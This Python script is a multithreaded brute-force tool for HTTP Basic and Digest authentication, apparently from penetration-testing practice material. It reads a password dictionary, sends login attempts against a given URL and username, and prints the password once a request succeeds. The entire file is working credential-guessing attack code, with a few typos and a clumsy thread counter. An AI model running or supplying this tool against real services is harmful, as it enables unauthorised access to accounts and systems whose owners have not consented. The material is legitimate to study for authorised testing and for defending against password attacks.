#!/usr/bin/python

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"
threads = 5
proxy = { "http"  : "http://127.0.0.1:8080", "https" : "https://127.0.0.1:8080" }


def banner():
    print("***************************\n Bruteforce HTTP Authentication")

def usage():
    print ("Usage: ")
    print ("    -w: url (https://test.com)")
    print ("    -u: username")
    print ("    -f: dictionary file")
    print ("    -m: method (basic or digest)")
    print ("Example: brute.py -w http://test.com -u admin -f passwords.txt -m method")

class request_performer(Thread):
    def __init__(self,passwd,user,url,method):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method

    def run(self):
        # r = {}
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    res = requests.get(self.url, auth=(self.username, self.password)) #proxies=proxy
                elif self.method == "digest":
                    res = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password)  )

                if res.status_code == 200:
                    hit = "0"
                    print ("[+] Pssword Found: " + self.password)
                    sys.exit()
                else:
                    print ("[-] Not valid password: " + self.password)
                    i[0] = i[0]-1
            except Exception as e:
                print (e)                  




def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
            opts, args = getopt.getopt(argv, "u:w:f:m:")   
    except getopt.GetoptError:
        print ("[!!] Error on Arguments!")
        sys.exit() 

    for opt, arg in opts:
        if opt == '-u':
            username = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictionary = arg 
        elif opt == '-m':
            method = arg

    try:
        f = open(dictionary,"r")
        passwords = f.readlines()
    except:
        print ("[!!] file dosnt Exist, please check if the path is correct!")  
        sys.exit()
    launcher_threads(passwords,threads,username,url,method)

def launcher_threads(passwords,threads,username,url,method):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] = i[0]+1
                    thread = request_performer(passwd, username, url,method)
                    thread.start()
            except KeyboardInterrupt:
                print ("[!!] Interrupted!")
                sys.exit()
            thread.join()            

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print ("[!!] Interupted")    
